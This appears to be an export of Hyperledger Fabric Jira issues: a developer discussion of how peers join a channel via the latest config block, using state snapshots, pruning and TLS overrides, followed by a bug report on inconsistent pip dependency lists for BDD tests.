 # I think that we should consider instead of joining the channel via the genesis block - joining the channel via the latest configuration block, (and have the MSP and anchor peers being configured with the latest configuration block data), with the following changes:
 ## A peer that has joined the channel has the latest configuration block *i* would need to obtain blocks *0.. i, i* in order to start servicing requests, since it cannot populate the stateDB until it has a continuous ledger from *0* to *i*, and it also has to validate the raw ledger in an ascending order. I think this is actually a blessing in disguise, because currently, a peer that joins the channel can service clients even though it has old data in its stateDB, and this would prevent the peer from doing that.
 ## A peer that has joined the channel and obtained the latest configuration block *i* would replicate the missing blocks *0 .. i* from other peers or from the ordering service by pulling blocks in a *descending* order ( i-1, --> i-2, --> ... 2, --> 1, --> 0) and for each block *j<i* it would verify the block by checking the previous hash on block *j+1* (which it would have at that point, since it would pull blocks in a descending order) and checking if the previous hash of block *j+1* matches the computed hash of the newly acquired block *j*. After this is done, the peer would validate the transactions from blocks *0..i* and would compute the stateDB (and the ""validated ledger""). After this - the peer would start pulling blocks from the orderer/peers in an ascending order.
 ## *We could also of course - not do backwards hash chain validation*, and instead - just make the peer use the latest config block and then pull blocks in the regular order from genesis up to the joinChannel block.
 # Snapshot solution:[~jyellick]: I see a few different ways to approach this:
 ## *Simplest:* Whenever a peer receives a config block for a channel, it takes a copy on write style snapshot of the state database. The CSCC or other exposes some interface to retrieve the hash of this state snapshot, or the state snapshot itself. When joining a new member, the member asks ""enough"" of the other members for the hash of the state snapshot at the most recent config block, and retrieves a copy of the state snapshot from someone. Then the peer is told to join the channel with the config block, the hash, and the state. The peer loads the state, verifies it against the hash, and is able to process further blocks based on the config block.
 ## *More complex:* Same as (1), except instead of exposing the state snapshot via CSCC, allow the state snapshot to be gossiped, so that peer need only be bootstrapped with the config block and the hash of the state at that config block. This makes it much much easier to bootstrap a new peer, but, the very significant downside to this is the DoS possibilities, and the fact that it is difficult to handle the byzantine attack of a peer sending bad state. (Yes, you can detect it, but this implies retrieving an entire new copy of the world state, which might be quite large. Therefore, retrieving the state snapshot from multiple members is problematic, as any one can poison the state snapshot with bad data but only the final result is detected to be bad, forcing an entirely new copy to be retrieved).
 ## *Most complex:* When a config block for a channel is received, the peers take a snapshot, compute its hash, and sign some block metadata about the hash of the world state. The peers then gossip about the hash, collecting eachother's signatures, and including them into their own block metadata. The config block could have a policy added, like ""SnapshotStateAttestations"", which could be evaluated against the signature set to determine whether the threshold of signatures had been met. Then, to join a channel, the peer would only need the config block (with its additional gossip-ed metadata) which already contains this hash, and a way to retrieve the state (either supplied manually as in (1), or automatically as in (2).

                   My gut feeling is that (1) or (3) with gossip of state would be best. IE, with (1) the process is simple to understand, simple to implement, but out of band and fairly manual.

                   Or, with (3) + state gossip, the process is a bit magical, and complex, but, it would make joining a peer to 'catch up' as simple as joining one on a new channel.

                   Additionally, we could relax the conditions for taking a state snapshot if this is too burdensome, for instance only taking a state snapshot when a particular config property is changed. So long as it is possible to determine if the config block should have a corresponding state snapshot, this is sufficient.

 

*Problem*: In both cases you have the last config block that is used to join the channel, but it may contain different root CA certs than was used in the past, and so - old blocks that the peer would get from the orderer or from other peers would contain endorsements or signatures on the block that the corresponding certificates no longer have a certificate validation path to the latest config block that was used to join channel with.
 * I assume that if we could make the validation code (VSCC) in the peer use the config blocks on the chain, and not the config block that was used to call join channel with, it would be solved.
 * If the state snapshot the joining peer would receive from other peers when it joins a channel would be created at the sequence of the last config block (the join channel block) - that would also solve the problem. But:
** If this is done manually, it would only make the join channel process more complex and also - the state snapshot might be very large and hard to transfer. 
** If this isn't done manually, but via having the joining peer contact other peers and ask for a snapshot to be created, this opens a window for abuse and DOS attacks, unless the snapshot is taken on each config block
** If a snapshot is taken on each config block, that might overload the peers of the system if a user would send several config updates (i.e - one that changes X, one that changes Y, etc.) but I think this should be considered and perhaps with guidelines to users (if you want to reconfigure a channel, do it via a single update and not via several) would be enough to solve the problem.
 

[~adc] [~ales] [~C0rWin] [~binhn] [~ellaki] [~mastersingh24] [~jyellick] [~kchristidis] [~vukolic]",,ahmedsajid,baohua,binhn,C0rWin,davidkhala,denyeart,grapebaba,guoger,Hangyu_FJH,IngoRammer,joaquimpedrooliveira,jyellick,kopaygorodsky,lmars,MariWade,mastersingh24,minollo,mplisov,n-horiguchi,nnao,peoplehlj,rchaturv,rhegde,rsherwood,siddjain,yacovm,YashGanthe,ymlbright,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-14420,,,,FAB-106,FAB-16715,FAB-16544,,,,,,,,,,"09/Jul/19 8:27 PM;josiebhai;20170911_105157.jpg;https://jira.hyperledger.org/secure/attachment/17388/20170911_105157.jpg","09/Jul/19 8:27 PM;josiebhai;20170911_105351.jpg;https://jira.hyperledger.org/secure/attachment/17389/20170911_105351.jpg","09/Jul/19 8:26 PM;josiebhai;redoc.html;https://jira.hyperledger.org/secure/attachment/17387/redoc.html","09/Jul/19 8:24 PM;josiebhai;swagger.json;https://jira.hyperledger.org/secure/attachment/17386/swagger.json",,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy84v:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ahmedsajid,baohua,binhn,C0rWin,davidkhala,denyeart,grapebaba,guoger,Hangyu_FJH,IngoRammer,joaquimpedrooliveira,jyellick,kopaygorodsky,lmars,MariWade,mastersingh24,minollo,mplisov,n-horiguchi,nnao,peoplehlj,rchaturv,rhegde,rsherwood,siddjain,yacovm,YashGanthe,ymlbright,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jul/17 10:18 PM;jyellick;> A peer that has joined the channel has the latest configuration block i would need to obtain blocks 0.. i, i in order to start servicing requests,

This is obviously problematic if {{i}} is very large.

> from other peers or from the ordering service by pulling blocks in a descending order

This sounds to me, like the ledger needs to support writing to blockstorage in a non-append mode.  I am far from an expert in this area, so please [~denyeart] or [~manish-sethi] please correct me, but the on disk format for the blocks is essentially a binary log, which has a sequence of marshaled blocks, concatenated together.  Adding a new block implies appending to the log and adding an index into the DB so that the block may be looked up by offset index into the file.

Because of this, the notion of prepending a block seems quite difficult to me, as it would invalidate all of the existing indices (and of course, filesystems do not generally support graceful prepends, they instead require writing the whole file).

A workaround for this could be to store the blocks not in the standard block storage until the whole chain has been retrieved, and then commit using the usual methods until caught up.  But, this sounds like throwaway work to me.

The **correct** way to implement this IMO is to allow a peer to join a channel with, not only a config block, but also a state database snapshot.  We need to support pruning eventually, and this meshes quite naturally.  Of course, maybe the work required to support pruning is too large to contain before this particular issue needs to be fixed, but I am wary of coding up a fix with function we know will become obsolete within a release or two.;;;","12/Jul/17 11:09 PM;yacovm;{quote}This is obviously problematic if {{i}} is very large.
{quote}
I agree, however - I think we need to take into account also:
 * the simplicity/complexity of the various solutions, and the time to market
 * The fact that in a way - the first approach listed is orthogonal to the ledger pruning.
 All we need is a way to make the peer configure itself using the latest config block. 
 I also think that we could make the peer pull all blocks starting from genesis at the regular order, and then just do the validation at the end, no?

{quote}This sounds to me, like the ledger needs to support writing to blockstorage in a non-append mode. I am far from an expert in this area, so please [~denyeart] or [~manish-sethi] please correct me, but the on disk format for the blocks is essentially a binary log, which has a sequence of marshaled blocks, concatenated together. Adding a new block implies appending to the log and adding an index into the DB so that the block may be looked up by offset index into the file.
{quote}
What if we could have 2 logs? After all - you only join a channel once, right?

So why not have 2 logs, given you joined the channel at configuration block *i*
 * A ledger that appends backwards from *i* to 0
 * A ledger that appends forward from *i* onward

{quote}The **correct** way to implement this IMO is to allow a peer to join a channel with, not only a config block, but also a state database snapshot. We need to support pruning eventually, and this meshes quite naturally. Of course, maybe the work required to support pruning is too large to contain before this particular issue needs to be fixed, but I am wary of coding up a fix with function we know will become obsolete within a release or two.
{quote}
I also agree that if the snapshot approach is going to be implemented in the future release I don't think it's worth doing the reverse ledger one.

However - I think that there are numerous questions that arise here (and we should also discuss this approach of course):
 * Where do you take the snapshot from? I assume it can only be a peer, since the OSN doesn't hold the state, only a raw ledger
 * How do you export the ledger? I assume you can't use the underlying DBMS support because you would need to export the data into the same format regardless if the peer is using couchDB or levelDB or whatever it'll be in the future.
 * How do you trust the peer that gives you the snapshot? What do you do if several peers ask you for a snapshot at the same time?
 * How does the peer even perform the snapshot? Can both levelDB and couchDB support an export of the database while the system is running?
 * I guess the peers would need to agree deterministic-ally on when to prune their ledger, right?
 But what if you have i.e a peer with ledger up to 130, and the other peers pruned the ledger at block 200. It means the peer has to receive all the blocks from 130 up to 200 from the ordering service. I'm saying that IMO we should carefully design it (should we go down this path).

[~jyellick] could you please add a possible solution to the JIRA description that lists this solution of state snapshot?

 ;;;","12/Jul/17 11:35 PM;jyellick;Per request of [~yacovm] here is a very rough suggestion for how pruning might be used in conjunction with the join of a config block.

I see a few different ways to approach this:

1. *Simplest:* Whenever a peer receives a config block for a channel, it takes a copy on write style snapshot of the state database.  The CSCC or other exposes some interface to retrieve the hash of this state snapshot, or the state snapshot itself.  When joining a new member, the member asks ""enough"" of the other members for the hash of the state snapshot at the most recent config block, and retrieves a copy of the state snapshot from someone.  Then the peer is told to join the channel with the config block, the hash, and the state.  The peer loads the state, verifies it against the hash, and is able to process further blocks based on the config block.

2. *More complex:* Same as (1), except instead of exposing the state snapshot via CSCC, allow the state snapshot to be gossiped, so that peer need only be bootstrapped with the config block and the hash of the state at that config block.  This makes it much much easier to bootstrap a new peer, but, the very significant downside to this is the DoS possibilities, and the fact that it is difficult to handle the byzantine attack of a peer sending bad state.  (Yes, you can detect it, but this implies retrieving an entire new copy of the world state, which might be quite large.  Therefore, retrieving the state snapshot from multiple members is problematic, as any one can poison the state snapshot with bad data but only the final result is detected to be bad, forcing an entirely new copy to be retrieved).

3. *Most complex:* When a config block for a channel is received, the peers take a snapshot, compute its hash, and sign some block metadata about the hash of the world state.  The peers then gossip about the hash, collecting eachother's signatures, and including them into their own block metadata.  The config block could have a policy added, like ""SnapshotStateAttestations"", which could be evaluated against the signature set to determine whether the threshold of signatures had been met.  Then, to join a channel, the peer would only need the config block (with its additional gossip-ed metadata) which already contains this hash, and a way to retrieve the state (either supplied manually as in (1), or automatically as in (2).

My gut feeling is that (1) or (3) with gossip of state would be best.  IE, with (1) the process is simple to understand, simple to implement, but out of band and fairly manual.  Or, with (3) + state gossip, the process is a bit magical, and complex, but, it would make joining a peer to 'catch up' as simple as joining one on a new channel.

Additionally, we could relax the conditions for taking a state snapshot if this is too burdensome, for instance only taking a state snapshot when a particular config property is changed.  So long as it is possible to determine if the config block should have a corresponding state snapshot, this is sufficient.

----

Edit: I did not see Yacov's post until I had already added this one.  With respect to how the state snapshot is taken, this is obviously a question for the ledger team.  My assumption is that it is possible to take a state snapshot, in a copy-on-write manner.  So that the peer may continue functioning normally, but also access the state from this snapshot.  In v0.5/0.6, there were multiple backends for storing the world state, but peers were still able to share state deltas and snapshots, so I assume this is possible.  Maybe this is more difficult in the new architecture, [~denyeart] [~manish-sethi]?

With respect to deciding how many snapshots to keep, and how often to take them, this seems like a fairly easily solvable problem.  We need a convention, and whether it is every config block, or only when some property changes, or the first config block which happens at least {{n}} blocks after the last snapshot was taken, etc., it shouldn't matter too much.;;;","12/Jul/17 11:49 PM;denyeart;[~jyellick] I agree that the pulling blocks in descending order would be a large amount of complexity and work for little value.  There is a large amount of re-use if we can pull blocks in typical ascending order, starting from genesis block (or a checkpoint in the future), validating trans and populating state db as we go.  Then compare hashes with i when you get that far along.  In the rare anomaly case that the hashes don't line up then there has indeed been a lot of wasted work, but I don't think we should optimize for a rare anomaly.;;;","13/Jul/17 8:07 PM;yacovm;{quote}3. *Most complex:* When a config block for a channel is received, the peers take a snapshot, compute its hash, and sign some block metadata about the hash of the world state. The peers then gossip about the hash, collecting eachother's signatures, and including them into their own block metadata. The config block could have a policy added, like ""SnapshotStateAttestations"", which could be evaluated against the signature set to determine whether the threshold of signatures had been met. Then, to join a channel, the peer would only need the config block (with its additional gossip-ed metadata) which already contains this hash, and a way to retrieve the state (either supplied manually as in (1), or automatically as in (2).
{quote}
 

So I think the general direction should be as you said but what do you think of the following changes:
 # The ledger of each channel tracks the total size (in bytes) of the blocks in it.
 # Once a block *i* made the size overgrow a certain *global per channel* threshold - a snapshot is taken in the following way:
 ## A ledger iterator object is initialized with a high isolation level that doesn't ""see"" older writes (I'm sure that in every KV store with versioning on the keys this has minimal performance overhead - start the iteration with a version number and then just return for each key the maximal version that is lower or equal to the version for the iteration) and simply scans the entire stateDB and writes it into a dump file in a certain format (this is to be independent of the underlying DB - whether it is couchDB or levelDB or something else.
 ## The dump is hashed.
 ## Gossip already publishes periodically a per-channel information that includes the height (in blocks) of a peer. This message is signed, and we could put into that message also the hash of the latest state snapshot. The last block index at which the state snapshot was taken can be inferred implicitly since it's a *global per channel property*.
 # When a peer from a new org (or also- not from a new org) joins the channel - it gets the latest config block, connects as usual to the other peers, and sees the hashes of the last state snapshot, and can apply some policy logic (i.e majority, hash must match its own org, etc.) to select the ""correct"" state hash, and then it can select any peer with that published state hash and start fetching this state hash from that peer (it can be done in chunks if it's too big).
 # at the end of the state replication - the peer hashes and compares the published hash to the actual hash, and if a mismatch is found - select a different peer and goes to (3).

 

What do you think [~jyellick]  (and others?);;;","13/Jul/17 11:19 PM;jyellick;> Once a block i made the size overgrow a certain global per channel threshold - a snapshot is taken in the following way:

I think taking the snapshot at arbitrary blocks rather than at config blocks has too many drawbacks to be feasible:

Drawback 1: Imagine a channel which is created, with two peers, one in each org. This channel gets used for a year without incident, and now has 1 million blocks. Because it is such a busy channel, the orgs decide to each add a new peer. Because the channel has not been reconfigured, the only config block available is the genesis block, so even though the new peers may fetch the state corresponding to block 1 mllion, they still have to retrieve all 1 million blocks between the last config block and the state snapshot, which rather defeats the entire purpose of the snapshot-ing.

Drawback 2: Imagine a channel with config block at block 100, and state snapshot taken at block 110. The new peer joins with config block 100, commits it to its ledger. Now, the ledger must have some sort of special commit path for recording blocks 101-110 without attempting to actually apply the transactions, then at block 110, the state snapshot is retrieved, and then when block 111 is committed, the traditional code path comes back into play. The peer basically is in a state of limbo where it is receiving and committing blocks, but does not have valid state.

Drawback 3: Imagine a channel with 1 million blocks, whose last state snapshot was taken at block 999,999,999. This channel adds a new member at block 1,000,001. The new member must join using this latest config block, but there is no state snapshot. The new member must wait for the chain size to be exceeded to publish a new state snapshot it can proceed from.

I would propose, that state snapshots _must_ be tied to config blocks, to avoid these three problems.

From an orderer perspective, our loose plans are to periodically prune the ledger at config blocks. This means the orderer will have to have some mechanism to automatically re-emit a config block. So, we could use the size based scheme of ""Every X MB of blocks re-emit a config block"". This would include an indication that this config block is intended as a pruning target, and the peers could cue off of this to trigger the state snapshot process.

>  (it can be done in chunks if it's too big).

I would propose that the neutral snapshot data format be designed with this in mind.  Rather than have a single large blob, it would make much more sense to construct this as something like a Merkle tree or simple hash table.  Then, instead of gossiping a single hash, the chunk hashes could be published, and the peer could safely retrieve small chunks from multiple peers and validate them individually (very much like standard p2p data distribution schemes).

In v0.5/0.6, with world states that grew to be sufficiently large, we constantly ran into timeouts or other problems which would cause the state transfer to fail, and then the entire large world state had to be discarded and pulled again.  Validating chunks as they arrive is a must in my head.;;;","14/Jul/17 6:48 AM;yacovm;{quote}I think taking the snapshot at arbitrary blocks rather than at config blocks has too many drawbacks to be feasible:
{quote}
So actually the crux of my comment wasn't in this part but rather at the gossip part - specifically, that each peer would create a snapshot and compute its hash and publish it periodically.


 I have nothing against the ordering service triggering a snapshot via a config update, I think it makes sense. 

However (in my previous reply) I had envisioned it working by newly joined peers pulling blocks only from the sequences that their bootstrapping snapshots left off (i.e in the snapshot it'll be mentioned the sequence at which it was taken at, and the peer would start pulling blocks with sequence greater of that sequence).
 I guess that requires storing the latest config block in the file system and not in the ledger (otherwise it won't make any sense). 
 Correct me if I'm wrong but Drawbacks 1-2 don't apply for this (are there new drawbacks, however?)

 
{quote}Drawback 3: Imagine a channel with 1 million blocks, whose last state snapshot was taken at block 999,999,999. This channel adds a new member at block 1,000,001. The new member must join using this latest config block, but there is no state snapshot. The new member must wait for the chain size to be exceeded to publish a new state snapshot it can proceed from.
{quote}
 The idea, is that we snapshot every time the ledger increases in some threshold bytes, and this would induce a ""size driven frequency"" on the ledger and then every new org would always have some snapshot to start from, or from the genesis block - and in such a case it shouldn't long to replicate (else - a snapshot would've been taken).

 
{quote}From an orderer perspective, our loose plans are to periodically prune the ledger at config blocks
{quote}
I understand, and it indeed makes sense to sync the peer snapshot cycle with the orderer pruning cycle.
{quote}Then, instead of gossiping a single hash, the chunk hashes could be published
{quote}
I don't see much sense in publishing the entire tree / list of hashes. It's redundant information that isn't useful to most peers in the network, but you're 100% right about the splitting into chunks and using hash approach.
 Instead, I think just the cumulative hash (or in the Merkle tree case - the root hash) should be published, and the joining peer could select (via a majority / other policy) the peers it wishes to replicate data with, and the hash list / Merkle tree would be obtained from these peers.

 ;;;","25/Jul/17 6:12 AM;binhn;I agreed that we should use the latest configtx for joining channel so that the peer has the proper configuration to participate. The remaining task is to replicate the ledger.

Let's assume no snapshots for a moment; that means, we need to get the entire ledger, and in this case, we should send the files (rather than blocks). The joining peer wouldn't get blocks and trying to write to files; it should just get the files and store them. After that, it can rebuild the state DBs and validate blockhash. 

With snapshots, I like Jason's idea of re-issuing configtx on snapshot block to simplify things. So at snapshot, we should cut the ledger file since the previous files might be archived and pruned. The replication process would remain the same: replicating files starting with the latest snapshot.

Thoughts?;;;","25/Jul/17 6:58 AM;jyellick;> we should send the files (rather than blocks).

I like the simplicity of replicating files, however, this seems like a problem if different peers are using different ledger types?  It also seems a little brittle if we decide to add or deprecate a ledger type in the future.  What sort of ABI stability do we have for these database files? (IE, if two peers are using different levels of the same DB, can they safely share files?)

[~denyeart] [~manish-sethi] what do you think? How hard would a DB independent state snapshot format be to implement? [~yacovm] do you see gossiping files like this as easier/comparable/harder than gossiping a purpose built state structure?;;;","25/Jul/17 7:35 AM;yacovm;I'm not a storage engine expert but I don't think that replicating databases while they are active is something that works with a high probability.
redo logs , index files, data files are changed while the database is running and mutating the files. You can't read atomically such a large amount of data without risking the read to return an overall inconsistent snapshot of the files.

The only way I think that you can replicate the data files is if you:
#  put the database into some state where it appends data only to redo logs
# flush the memory buffers
# copy the files aside
# change the DB back to the normal operation mode
# replicate the files that were copied aside

Also Jason is right about the heterogeneity of the DBs.

{quote}Yacov Manevich do you see gossiping files like this as easier/comparable/harder than gossiping a purpose built state structure?{quote}

We shouldn't gossip these files but rather send them p2p like we do in state transfer. 
The state transfer currently gossips blocks that are to us sequenced blobs.;;;","25/Jul/17 11:10 PM;binhn;[~yacovm], [~jyellick], [~denyeart]

The ledger stores blocks in append-only files then updates the DBs (state, history, private) from the transactions in the blocks. The append-only files were what I referred to because the peer can rebuild the DBs from these files. ;;;","25/Jul/17 11:19 PM;yacovm;{quote}The ledger stores blocks in append-only files then updates the DBs (state, history, private) from the transactions in the blocks. The append-only files were what I referred to because the peer can rebuild the DBs from these files. {quote}


I see, I misunderstood you. 
But, if we use the latest config block for joining a channel and then rebuilding the DB from the ledger we have another problem which I stated in the description of the JIRA:
{quote}Problem: In both cases you have the last config block that is used to join the channel, but it may contain different root CA certs than was used in the past, and so - old blocks that the peer would get from the orderer or from other peers would contain endorsements or signatures on the block that the corresponding certificates no longer have a certificate validation path to the latest config block that was used to join channel with.{quote}

This would essentially cause the peer that joined to reach a different state than the peers that are in the channel already, because it would deem some transactions as invalid while they were validated by the old peers.

I also listed a solution for that:
{quote}I assume that if we could make the validation code (VSCC) in the peer use the config blocks on the chain, and not the config block that was used to call join channel with, it would be solved.{quote}

;;;","26/Jul/17 2:31 AM;binhn;[~yacovm]  yes, we would need new validation code to pick up the configtx from the ledger, but keep the latest configtx to connect to orderers or other orgs.  

If we had quorum validation (part of checkpoint), we could assume the transaction validity and only check the block hashes (from genesis/snapshot block to the current config block);;;","26/Jul/17 3:14 AM;jyellick;> I assume that if we could make the validation code (VSCC) in the peer use the config blocks on the chain, and not the config block that was used to call join channel with, it would be solved.

My biggest issue with this, is that we take a critical, already complex code path (transaction validation) which must absolutely always be 100% deterministic, and we add more complexity, with more conditional branching, and introduce more opportunities for non-determinism.

We certainly can do this correctly, but I question the value of putting too much effort into this.  If we implement proper pruning/checkpointing, we can have a new peer join at the most recent config block, fetch a state snapshot for that block, and then simply follow the normal validation process forward.  This has no fetching of older blocks, no out of order committing, no new transaction validation path etc.

Since, we have to implement pruning/checkpointing at some point in the near future anyway, it seems more natural to apply development effort towards that goal, and greatly simplify this work.;;;","26/Jul/17 4:48 AM;yacovm;{quote}My biggest issue with this, is that we take a critical, already complex code path (transaction validation) which must absolutely always be 100% deterministic, and we add more complexity, with more conditional branching, and introduce more opportunities for non-determinism.{quote}

I don't see the issue. we don't need to change anything in the validation code. Nothing at all. 
We just need to be able to control the MSP manager instance of the channel - instead of having just 1 MSP manager per channel - have 2 of them: 
* One that is always initialized according to the latest config block received that'll be used for communication
* One that is always initialized with the genesis block and is updated as things work now.
what am I missing?

{quote}Since, we have to implement pruning/checkpointing at some point in the near future anyway, it seems more natural to apply development effort towards that goal, and greatly simplify this work.{quote}
I put the 2 options on the table so it can be decided, but I think that doing this one is not much work and pruning and snapshotting is much work and also additional integration work (p2p overhead right?)

I personally do not have any strong opinion about which decision to take, or time-lines. 
I just want to lay out the options and ensure we see all options before us, and their drawbacks, etc.;;;","26/Jul/17 11:25 AM;jyellick;> I don't see the issue. we don't need to change anything in the validation code. Nothing at all. We just need to be able to control the MSP manager instance of the channel - instead of having just 1 MSP manager per channel - have 2 of them:

This is nearly right, you would also need to maintain a second copy of the policy manager to ensure that the correct policy definition is being used in addition to the correct crypto material.  Then we need to make sure that in whatever context we validate signatures or evaluate policies, that we have the correct pair in use.

I don't think this is impossible, but having already taken one stab at removing the singleton MSP manager from the code (and failing), I think this is much more invasive than might sanely be expected.  The again, maybe this is a good occasion to rid ourselves of some of these anti-patterns.

> I put the 2 options on the table so it can be decided, but I think that doing this one is not much work and pruning and snapshotting is much work and also additional integration work (p2p overhead right?)

Understood.  Obviously I'm skeptical about the multiple validation contexts being ""not much work"", but I would be happy to be wrong.;;;","26/Jul/17 4:21 PM;yacovm;{quote}This is nearly right, you would also need to maintain a second copy of the policy manager to ensure that the correct policy definition is being used in addition to the correct crypto material. Then we need to make sure that in whatever context we validate signatures or evaluate policies, that we have the correct pair in use.{quote}

Of course, I was sure it's implicitly deduced since the MSP is updated via the policy manager so you'll need a new one for the new MSP.


;;;","27/Jul/17 12:15 AM;jyellick;> Of course, I was sure it's implicitly deduced since the MSP is updated via the policy manager so you'll need a new one for the new MSP.

Not to nit-pick, but this is still not accurate.

The standard {{msp.MSPManager}} type is not mutable.  However, it is embedded as a member of the {{config/msp}} {{msp.MSPConfigHandler}}.  In general, pieces of the system retain a reference to this {{msp.MSPConfigHandler}} as an {{msp.MSPManager}}, in this way, when the underlying manager changes, their reference does not need to be updated.

The {{msp.MSPConfigHandler}} is updated by the {{configtx.ManagerImpl}}.  The {{policies.ManagerImpl}} is initialized with a {{policies.Provider}} map, one of which is for signature policies, which depends upon a reference to a {{msp.MSPManager}}.  This reference is actually given as the {{msp.MSPConfigHandler}} so that the reference is to the current {{msp.MSPManager}} on update.  Finally, the {{policies.ManagerImpl}} has the policies maintained via the {{configtx.ManagerImpl}}.

Although a little complex, simply maintaining two copies of this entire setup should be possible with no real problems.  The place where things get very difficult is with the {{msp.mgmt}} singletons.  Essentially, when a JoinChannel occurs, the peer takes the {{msp.MSPConfigHandler}} from the config, and sets it as the {{msp.MSPManager}} in the {{msp.mgmt}} singletons.  Then, the peer looks up the MSP manager via these singletons (rather than actually retaining a reference to the channel resources, and pulling the {{msp.MSPManager}} from there.

So the real question is, for all of those contexts which are actually using the {{msp.mgmt}} singletons, how do you route them to the correct {{msp.MSPManager}}?

;;;","07/Sep/17 11:52 AM;davidkhala;It seems this work-flow bother me too.
In my case, a new peer is created with new MSP and propose a channel update with this new MSP. 
Then I tried to do 'join-channel' for the the newly created peer and it even succeeded(with the genesis block)
But in next step to instantiate chaincode on this new peer, error occurred like:

{code:java}
Error: Failed to deserialize creator identity, err MSP AMMSP is unknown
{code}

;;;","03/Aug/18 11:58 PM;Clayton Sims;This is related to Fab 106.   It is not in plan for 1.3;;;","28/Feb/19 4:36 AM;jyellick;[~mastersingh24] I think this is something you could tackle with some dialer/TLS overrides pretty easily?;;;","28/Feb/19 6:31 AM;mastersingh24;I think we can do the following:

1) Add a a config section which allows you to specify a set of root CAs to trust for TLS communication with orderers which would be appended in addition to the list created from the config block
2) We can also add a config section which allows you to map orderer:port to a different orderer:port as well.;;;","28/Feb/19 6:48 AM;jyellick;Sounds good to me +1;;;","05/Mar/19 1:04 AM;denyeart;[~mastersingh24] I set the FixVersion for v1.4.1 and v2.0 for the tactical approach mentioned here, is that your intent?;;;","22/Mar/19 9:11 PM;denyeart;I've updated the title of this jira to indicate the tactical approach of allowing peer to override channel configuration, specifically orderer end points and root CAs to trust.

Alternatively a separate jira could be created for the tactical approach and we could revert back to the original name... either way is fine by me...;;;","29/May/19 7:31 PM;denyeart;Note that TLS cert overrides went into v1.4.1 under  FAB-14420.

Need to port to master.

Also need to consider orderer endpoint overrides.;;;","04/Jul/19 10:44 AM;baohua;Some simple solution by using core.yaml config, the steps are like the following:
 # Allow peer to read the config (tls, endpoints, etc) from core.yaml and ignore what is specified in the config block when joined a channel;
 # In core.yaml, also specify some block height that once the local ledger size is larger than that, then switch to use the channel config.;;;","03/Dec/19 5:41 AM;denyeart;[~mastersingh24] I've linked the Jiras for orderer endpoint override and TLS cert override. What else is intended for this Jira specifically?;;;","25/Jun/20 7:32 PM;denyeart;Note - the overrides were finished in FAB-16544.;;;",,,,,,,,,,
Inconsistent description of dependencies of BDD tests,FAB-5289,19211,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ynamiki,ynamiki,ynamiki,12/Jul/17 9:56 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,26/Nov/17 9:28 PM,v1.0.0,,,v1.1.0,,fabric-build,,,,,,0,,,,,,,"As of e4b47043, I find three different descriptions of dependencies of BDD tests (e.g. install_behave.sh says grpcio==0.13.1, the documents says grpcio==1.0.4, ...).
These should be consistent.

scripts/install_behave.sh
{code}
pip install --upgrade pip
pip install behave
pip install nose

# updater-server, update-engine, and update-service-common dependencies (for running locally)
pip install -I flask==0.10.1 python-dateutil==2.2 pytz==2014.3 pyyaml==3.10 couchdb==1.0 flask-cors==2.0.1 requests==2.4.3 pyOpenSSL==16.2.0 pysha3==1.0b1

# Python grpc package for behave tests
# Required to update six for grpcio
pip install --ignore-installed six
pip install --upgrade 'grpcio==0.13.1'

# Pip packages required for some behave tests
pip install ecdsa python-slugify b3j0f.aop
pip install google
pip install protobuf
pip install pyyaml
pip install pykafka
{code}

[Document|http://hyperledger-fabric.readthedocs.io/en/stable/dev-setup/devenv.html#pip-behave-and-docker-compose]
{code}
pip install --upgrade pip
pip install behave nose docker-compose
pip install -I flask==0.10.1 python-dateutil==2.2 pytz==2014.3 pyyaml==3.10 couchdb==1.0 flask-cors==2.0.1 requests==2.4.3 pyOpenSSL==16.2.0 pysha3==1.0b1 grpcio==1.0.4

#PIP packages required for some behave tests
pip install urllib3 ndg-httpsclient pyasn1 ecdsa python-slugify grpcio-tools jinja2 b3j0f.aop six
{code}

bddtests/README.md
{code}
pip install behave
pip install grpcio-tools
pip install ""pysha3==1.0b1""
pip install b3j0f.aop
pip install jinja2
# The pyopenssl install gives errors, but installs succeeds
pip install pyopenssl
pip install ecdsa
pip install python-slugify
pip install pyyaml
{code}",,markparz,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Jul/17 5:08 PM;ynamiki;pip-requirements.txt;https://jira.hyperledger.org/secure/attachment/11695/pip-requirements.txt",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy853:",,,,,,,,,,,,,,,,,,,,,,,markparz,ynamiki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Jul/17 5:31 PM;ynamiki;List of packages installed by each method.

|| ||Script||Document||Read Me||
|asn1crypto|0.22.0|0.22.0|0.22.0|
|b3j0f.aop|0.8.4|0.8.4|0.8.4|
|b3j0f.utils|1.4.4|1.4.4|1.4.4|
|*beautifulsoup4*|4.6.0| | |
|behave|1.2.5|1.2.5|1.2.5|
|cffi|1.10.0|1.10.0|1.10.0|
|*CouchDB*|1.0|1.0| |
|cryptography|1.9|1.9|1.9|
|ecdsa|0.13|0.13|0.13|
|enum34|1.1.6|1.1.6|1.1.6|
|*Flask*|0.10.1|0.10.1| |
|*Flask-Cors*|2.0.1|2.0.1| |
|futures|3.1.1|3.1.1|3.1.1|
|*gevent*|1.2.2| | |
|*google*|1.9.3| | |
|*greenlet*|0.4.12| | |
|*grpcio*|0.13.1|1.4.0|1.4.0|
|*grpcio-tools*| |1.4.0|1.4.0|
|idna|2.5|2.5|2.5|
|ipaddress|1.0.18|1.0.18|1.0.18|
|*itsdangerous*|0.24|0.24| |
|Jinja2|2.9.6|2.9.6|2.9.6|
|*kazoo*|2.4.0| | |
|MarkupSafe|1.0|1.0|1.0|
|*ndg-httpsclient*| |0.4.2| |
|*nose*|1.3.7|1.3.7| |
|ordereddict|1.1|1.1|1.1|
|parse|1.8.2|1.8.2|1.8.2|
|parse-type|0.3.4|0.3.4|0.3.4|
